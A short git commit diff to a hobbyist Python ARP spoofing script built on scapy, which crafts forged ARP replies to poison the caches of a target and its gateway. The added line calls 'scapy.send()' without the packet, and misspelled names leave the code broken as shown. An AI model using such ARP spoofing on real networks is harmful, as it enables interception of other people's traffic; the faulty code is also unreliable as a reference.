ec9f2822771f7d476d27fb97dbd3d7979f68239b
Pooja Nokhwal <poojanokhwal04@gmail.com>
2025-05-17 21:58:54 +0530

    Testing cloning

--- ARPSpooferUsingPython/arpspoofer.py
+++ ARPSpooferUsingPython/arpspoofer.py
@@ -9,7 +9,7 @@ def get_arguments():
 def spoof(target_ip, spoof_ip):
     target_mac=get_mac(target_ip)
     packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-
+    scapy.send()
 arguments=get_argumnets()
 spoof(arguments.target, argument.gateway)
 spoof(argument.gateway, arguments.target)
